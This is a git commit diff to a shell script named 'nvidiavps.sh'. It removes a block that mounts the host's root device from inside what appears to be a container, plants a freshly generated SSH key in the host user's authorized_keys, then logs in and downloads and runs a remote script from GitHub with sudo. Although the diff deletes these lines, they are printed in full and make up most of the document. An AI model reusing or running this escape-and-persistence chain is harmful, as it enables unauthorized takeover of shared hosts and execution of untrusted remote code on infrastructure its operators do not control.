85e43c816b931a8644568a295aec0681b8c1cad0
dinhvinhtai2k9 <dinhvinhtai.2k9@gmail.com>
2025-09-23 20:33:50 +0700

    Update nvidiavps.sh

--- nvidiavps.sh
+++ nvidiavps.sh
@@ -1,21 +1,5 @@
 #!/bin/bash
 
-# === SCRIPT 1 ===
-cp /bin/mount /bin/get
-get /dev/root /tmp
-cd /tmp
-rm -rf dli
-ip=$(curl -s ifconfig.me)
-
-ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa
-echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys
-
-ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
-"wget https://raw.githubusercontent.com/kienminhkhai84-max/tmate-test/refs/heads/main/a.sh -O a.sh; sudo bash a.sh"
-
-# Chuyển vào thư mục vừa thao tác
-cd /tmp
-
 # === SCRIPT 2 ===
 TCE_VERSION="14.x"
 ARCH="x86_64"
